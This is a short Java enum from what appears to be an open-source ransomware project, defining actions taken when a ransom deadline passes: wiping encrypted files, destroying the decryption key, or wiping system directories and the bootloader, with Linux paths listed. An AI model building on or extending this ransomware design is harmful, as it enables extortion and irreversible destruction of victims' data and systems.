package com.bechris100.open_ransomware.software.action;

public enum TimeoutAction {

    /**
     * Wipes all encrypted files off the disc.
     */
    WIPE_FILES,

    /**
     * No Access to the Key from the hacker and the user, no data can be recovered.
     */
    WIPE_KEY,

    /**
     * This is a dangerous task! Never execute it on anyone!
     * <p />
     * Wipes the System clean (including the bootloader).
     * <p />
     * On Linux, it wipes /boot, /usr, /opt, /etc, /mnt, /run, /sys, /srv and /var. If anything else included (/snap and /media),
     * these will be wiped too.
     */
    WIPE_SYS

}
